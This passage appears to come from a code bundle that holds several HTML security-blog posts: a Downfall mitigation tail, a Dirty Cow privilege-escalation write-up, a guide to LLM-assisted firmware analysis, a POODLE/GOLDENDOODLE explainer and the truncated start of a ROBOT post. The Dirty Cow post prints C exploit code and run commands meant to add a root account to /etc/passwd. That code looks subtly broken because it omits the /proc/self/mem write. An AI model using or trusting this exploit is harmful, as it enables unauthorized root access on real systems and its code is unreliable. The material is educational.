          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,hv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,fv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,mv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,gv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
